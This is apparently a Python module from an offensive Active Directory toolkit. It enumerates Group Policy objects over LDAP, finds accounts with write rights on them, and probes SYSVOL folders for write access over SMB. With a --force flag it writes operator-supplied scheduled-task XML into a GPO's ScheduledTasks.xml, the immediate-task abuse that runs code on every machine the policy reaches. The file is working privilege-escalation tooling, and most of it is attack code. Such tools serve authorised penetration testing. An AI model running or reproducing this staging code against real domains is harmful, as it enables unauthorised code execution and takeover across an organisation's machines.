"""GPO SYSVOL abuse — detect writable GPO file paths; optional staged write (--force).

Detect path: SMB list/check of Machine/Preferences or Scripts under gPCFileSysPath.
Write path (force): stage a benign marker or operator-supplied scheduled task XML
into the GPO directory for immediate-task abuse patterns.
"""

from __future__ import annotations

import json
from pathlib import PureWindowsPath
from typing import Any

from ldap3 import SUBTREE
from rich.console import Console

from adaf_attack.core.acl import fetch_sd, parse_interesting_aces
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()

GPO_ATTRS = [
    "displayName",
    "cn",
    "distinguishedName",
    "gPCFileSysPath",
    "versionNumber",
]


def _smb_connect(target: Target, host: str):
    from impacket.smbconnection import SMBConnection

    lm, nt = target.lm_nt_hashes()
    smb = SMBConnection(host, host, timeout=5)
    if target.hashes:
        smb.login(target.username or "", target.password or "", target.domain, lmhash=lm, nthash=nt)
    elif target.username and target.password:
        smb.login(target.username, target.password, target.domain)
    else:
        smb.login("", "")
    return smb


def _parse_sysvol_unc(unc: str) -> tuple[str, str] | None:
    """\\\\domain\\SYSVOL\\domain\\Policies\\{GUID} → (share_host_hint, relative path)."""
    if not unc:
        return None
    # normalize
    p = unc.replace("/", "\\")
    if not p.startswith("\\\\"):
        return None
    parts = [x for x in p.split("\\") if x]
    # host, share, ...
    if len(parts) < 4:
        return None
    host = parts[0]
    # SYSVOL share path from Policies onward
    try:
        idx = next(i for i, x in enumerate(parts) if x.lower() == "sysvol")
    except StopIteration:
        return None
    rel = "/".join(parts[idx + 1 :])  # domain/Policies/{GUID}/...
    return host, rel


@register_capability(
    id="gpo-sysvol",
    summary="Probe SYSVOL GPO paths for write; optional stage requires --force",
    category="privilege-escalation",
    tags=("gpo", "sysvol", "scheduled-task", "abuse"),
    destructive=True,
)
class GpoSysvol:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        stage_gpo = kwargs.get("gpo") or kwargs.get("cn")  # GUID or display name
        payload_text = kwargs.get("payload")  # optional XML/script body

        console.print(f"[bold]GPO SYSVOL[/bold] → {target.domain} @ {target.dc_ip}")
        conn, base_dn, _cfg = ldap_connect(target)

        conn.search(
            base_dn,
            "(objectClass=groupPolicyContainer)",
            search_scope=SUBTREE,
            attributes=GPO_ATTRS,
        )

        gpos: list[dict[str, Any]] = []
        writable_sysvol: list[dict[str, Any]] = []

        for entry in conn.entries:
            cn = str(entry.cn) if entry.cn else None
            display = str(entry.displayName) if entry.displayName else cn
            unc = str(entry.gPCFileSysPath) if entry.gPCFileSysPath else None
            if not cn or not unc:
                continue
            dn = str(entry.distinguishedName)
            item: dict[str, Any] = {
                "cn": cn,
                "display_name": display,
                "dn": dn,
                "sysvol": unc,
                "ldap_writers": [],
                "sysvol_writable": None,
                "sysvol_error": None,
            }

            # LDAP writers
            sd = fetch_sd(conn, dn)
            if sd:
                try:
                    for ace in parse_interesting_aces(sd):
                        if ace.right in (
                            "GenericAll",
                            "GenericWrite",
                            "WriteDacl",
                            "WriteOwner",
                            "WriteProperty",
                        ):
                            item["ldap_writers"].append(
                                {"sid": ace.principal_sid, "right": ace.right}
                            )
                except Exception:  # noqa: BLE001
                    pass

            # SMB probe
            parsed = _parse_sysvol_unc(unc)
            if parsed and target.has_credentials:
                host_hint, rel = parsed
                # Prefer DC IP for SYSVOL
                host = target.dc_ip or host_hint
                try:
                    smb = _smb_connect(target, host)
                    # Try open SYSVOL tree
                    share = "SYSVOL"
                    tid = smb.connectTree(share)
                    # list the policy folder
                    # rel like: corp.local/Policies/{GUID}
                    check_path = rel.replace("\\", "/")
                    try:
                        smb.listPath(share, check_path + "/*")
                        item["sysvol_reachable"] = True
                    except Exception as exc:  # noqa: BLE001
                        item["sysvol_reachable"] = False
                        item["sysvol_error"] = f"list: {exc}"

                    # Write probe: try create a temp file then delete (only if force)
                    if force and (
                        stage_gpo is None
                        or stage_gpo.lower() in (cn.lower(), (display or "").lower())
                    ):
                        probe_name = check_path + "/Machine/adaf_write_probe.txt"
                        try:
                            fid = smb.createFile(tid, probe_name.replace("/", "\\"))
                            smb.writeFile(tid, fid, b"adaf-attack write probe\n")
                            smb.closeFile(tid, fid)
                            item["sysvol_writable"] = True
                            try:
                                smb.deleteFile(share, probe_name.replace("/", "\\"))
                            except Exception:  # noqa: BLE001
                                pass
                            writable_sysvol.append(item)
                            console.print(
                                f"  [red]WRITABLE SYSVOL[/red]  {display}  {unc}"
                            )
                        except Exception as exc:  # noqa: BLE001
                            item["sysvol_writable"] = False
                            item["sysvol_error"] = f"write: {exc}"
                    smb.disconnectTree(tid)
                    smb.logoff()
                except Exception as exc:  # noqa: BLE001
                    item["sysvol_error"] = str(exc)

            gpo_id = f"GPO@{cn.upper()}@{target.domain.upper()}"
            graph.add_node(
                gpo_id,
                "GPO",
                cn=cn,
                display_name=display,
                sysvol=unc,
                sysvol_writable=item.get("sysvol_writable"),
            )
            if item.get("sysvol_writable"):
                graph.add_edge(gpo_id, gpo_id, "WriteSYSVOL")
            for w in item["ldap_writers"]:
                src = f"SID@{w['sid']}"
                graph.add_node(src, "Base", sid=w["sid"])
                graph.add_edge(src, gpo_id, "WriteGPO", right=w["right"])

            gpos.append(item)
            flag = ""
            if item.get("sysvol_writable"):
                flag = " WRITE"
            elif item.get("sysvol_reachable"):
                flag = " reachable"
            console.print(f"  GPO {display}{flag}")

        # Optional stage of scheduled task XML into a specific GPO
        stage_result = None
        if force and stage_gpo and payload_text:
            stage_result = self._stage_task(
                target, gpos, stage_gpo, payload_text, session
            )

        conn.unbind()
        result = {
            "domain": target.domain,
            "gpo_count": len(gpos),
            "gpos": gpos,
            "writable_sysvol_count": len(writable_sysvol),
            "stage": stage_result,
            "note": "Write probe / stage only run with --force",
        }
        out_path = session.path("gpo-sysvol.json")
        out_path.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log(
            "gpo-sysvol.complete",
            gpos=len(gpos),
            writable=len(writable_sysvol),
        )
        console.print(
            f"[green]Done[/green]  gpos={len(gpos)}  writable_sysvol={len(writable_sysvol)}"
        )
        if not force:
            console.print(
                "[dim]Detect-only. Re-run with --force to probe writes / stage payload.[/dim]"
            )
        console.print(f"Results → {out_path}")
        return result

    def _stage_task(
        self,
        target: Target,
        gpos: list[dict[str, Any]],
        stage_gpo: str,
        payload_text: str,
        session: Session,
    ) -> dict[str, Any]:
        match = next(
            (
                g
                for g in gpos
                if stage_gpo.lower() in (g["cn"].lower(), (g.get("display_name") or "").lower())
            ),
            None,
        )
        if not match or not match.get("sysvol"):
            return {"ok": False, "error": f"GPO not found: {stage_gpo}"}

        parsed = _parse_sysvol_unc(match["sysvol"])
        if not parsed:
            return {"ok": False, "error": "bad SYSVOL UNC"}
        _host_hint, rel = parsed
        host = target.dc_ip
        # Immediate Task path under Machine/Preferences/ScheduledTasks/
        rel_task_dir = rel.replace("\\", "/") + "/Machine/Preferences/ScheduledTasks"
        rel_task = rel_task_dir + "/ScheduledTasks.xml"

        try:
            smb = _smb_connect(target, host)
            share = "SYSVOL"
            tid = smb.connectTree(share)
            # ensure directory — may fail if missing; try write file directly
            data = payload_text.encode("utf-8")
            try:
                fid = smb.createFile(tid, rel_task.replace("/", "\\"))
            except Exception:
                # try simpler marker under Machine
                rel_task = rel.replace("\\", "/") + "/Machine/adaf_staged.xml"
                fid = smb.createFile(tid, rel_task.replace("/", "\\"))
            smb.writeFile(tid, fid, data)
            smb.closeFile(tid, fid)
            smb.disconnectTree(tid)
            smb.logoff()
            console.print(f"  [red]STAGED[/red] → \\\\{host}\\SYSVOL\\{rel_task.replace('/', chr(92))}")
            return {"ok": True, "path": rel_task, "gpo": match["cn"]}
        except Exception as exc:  # noqa: BLE001
            return {"ok": False, "error": str(exc), "gpo": match["cn"]}
